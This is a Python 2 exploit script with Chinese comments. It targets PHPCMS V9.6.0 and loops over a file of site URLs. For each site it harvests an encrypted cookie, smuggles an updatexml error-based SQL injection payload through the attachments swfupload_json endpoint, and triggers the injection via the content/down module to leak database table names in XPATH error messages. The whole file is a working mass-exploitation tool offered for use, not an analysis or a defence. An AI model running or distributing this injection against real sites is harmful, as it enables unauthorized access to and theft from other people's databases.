#coding=utf-8
import sys
import requests
import re 
import urllib

def message():
	print ("[*]usage:python %s filename" % sys.argv[0])

# 判断是否为 PHPCMS
def is_PHPCMS():
	power = ""
	version = ""
	content = requests.get(siteurl).text
	match = re.search(r"Powered by (.*)>(.*)</a></strong> <em>(\S+)</em>", content)
	if match:
		power = match.group(2)
		version = match.group(3)
	if power.lower()!='phpcms' and version!='V9.6.0':
		print "[!]非对应版本框架或版本号"
		pass

# 获取加密cookie
def get_cookie(siteurl):
	global userid
	try:
		url = siteurl + "/index.php"
		get_params = {
			'm':'wap',
			'c':'index',
			'siteid':'1',
		}
		content = requests.get(url, params=get_params ,timeout=3.5)
		for cookie in content.cookies:
			if '_siteid' in cookie.name:
				userid = cookie.value
	except:
		pass

# 将payload与cookie混合
def put_payload(siteurl):
	global attack_payload
	try:
		url = siteurl + "/index.php"
		payload = '&id=%*27 and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#&m=1&modelid=2&f=test&catid=7&'
		url = url + '?m=attachment&c=attachments&a=swfupload_json&aid=1&src=' + urllib.quote(payload)
		data = {'userid_flash': userid}
		content = requests.post(url, data=data ,timeout=3.5)
		for cookie in content.cookies:
			if '_att_json' in cookie.name:
				attack_payload = cookie.value
	except:
		pass

# 解码攻击载荷
def get_payload_result(siteurl):
	try:
		url = siteurl + "/index.php"
		get_params = {
			'm':'content',
			'c':'down',
			'a_k':attack_payload
		}
		respon = requests.get(url, params=get_params ,timeout=3.5)
		match = re.search(r"XPATH syntax error: '(\S+)'", respon.content)
		if match:
			print match.group(1),siteurl
	except:
		pass


if __name__ == '__main__':
	if len(sys.argv) != 2:
		message()
		sys.exit(0)
	with open(sys.argv[1],'r') as f:
		site = f.readlines()
	for siteurl in site:
		get_cookie(siteurl.strip())
		put_payload(siteurl.strip())
		get_payload_result(siteurl.strip())
